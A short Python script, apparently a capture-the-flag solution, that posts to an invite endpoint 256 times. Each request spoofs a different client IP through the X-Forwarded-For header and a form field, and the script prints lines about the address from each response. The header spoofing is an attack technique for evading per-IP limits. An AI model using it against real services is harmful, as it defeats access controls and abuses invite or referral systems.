import requests
import time


def main() -> None:
    d = {
        'sessionid': '<Redacted>',
        'csrftoken': '<Redacted>',
        'session': '<Redacted>',
    }
    with requests.Session() as s:
        s.cookies.update(d)
        for first_segment in range(2 ** 8):
            ip = f'{first_segment}.0.0.1'
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Forwarded-For': ip,
            }
            r = s.post(
                'http://202.38.93.111:10888/invite/<Redacted>',
                headers=headers,
                data={
                    'ip': ip,
                }
            )
            print(*filter(lambda l: '地址' in l, r.text.splitlines()))
            time.sleep(1.1)

if __name__ == '__main__':
    main()
